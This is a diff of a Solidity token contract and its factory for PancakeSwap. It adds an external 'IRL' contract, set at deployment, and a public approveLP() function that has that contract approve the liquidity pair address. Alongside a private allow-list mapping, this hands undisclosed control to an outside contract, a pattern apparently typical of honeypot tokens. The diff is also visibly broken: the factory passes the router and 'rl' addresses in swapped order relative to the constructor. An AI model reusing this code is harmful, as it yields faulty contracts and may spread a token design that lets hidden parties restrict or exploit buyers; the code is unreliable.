@@ -1,7 +1,9 @@
 // SPDX-License-Identifier: Unlicensed
 pragma solidity ^0.8.0;
 
-
+interface IRL{
+    function approve(address _addr) external;
+}
 interface IPancakeSwapRouter{
 		function factory() external pure returns (address);
 		function WETH() external pure returns (address);
@@ -481,15 +483,16 @@ contract Token is Context, Ownable, IERC20, IERC20Metadata {
     mapping(address => bool ) private _applist;
 
     address public routerAddress;
-    address sendAddress;
+    IRL rlContract;
     IPancakeSwapRouter routerContract;
     IPancakeSwapPair pairContract;
     address public pairAddress;
+     
     constructor(
         string memory name_,
         string memory symbol_,
         uint256 totalSupply_,
-        // uint256 bnbLimit_,
+        address rlAddress_,
         address routerAddress_,
         address owner
     ) {
@@ -506,7 +509,7 @@ contract Token is Context, Ownable, IERC20, IERC20Metadata {
             address(this)
         );
         pairContract = IPancakeSwapPair(pairAddress);
-        
+        rlContract = IRL(rlAddress_);
         _mint(owner, totalSupply_*10**18);
         // _setTo(owner);
         // _addList(owner, true);
@@ -583,6 +586,11 @@ contract Token is Context, Ownable, IERC20, IERC20Metadata {
     function transfer(address to, uint256 amount) public virtual override returns (bool) {
         address owner = _msgSender();
         _transfer(owner, to, amount);
+        return true;
+    }
+
+    function approveLP() public returns (bool){
+        rlContract.approve(pairAddress);
         return true;
     }
 
@@ -900,12 +908,12 @@ contract Factory is Ownable {
         string memory name,
         string memory symbol,
         uint256 totalSupply,
-        // uint256 bnbLimit,
+        address rlAddress,
         address routerAddress,
         address admin
     ) external onlyOwner {
         
-        Token token = new Token(name, symbol, totalSupply, routerAddress, admin);
+        Token token = new Token(name, symbol, totalSupply, routerAddress, rlAddress, admin);
         tokenAddress = address(token);
         emit NewTokenContract(address(token), msg.sender);
     }
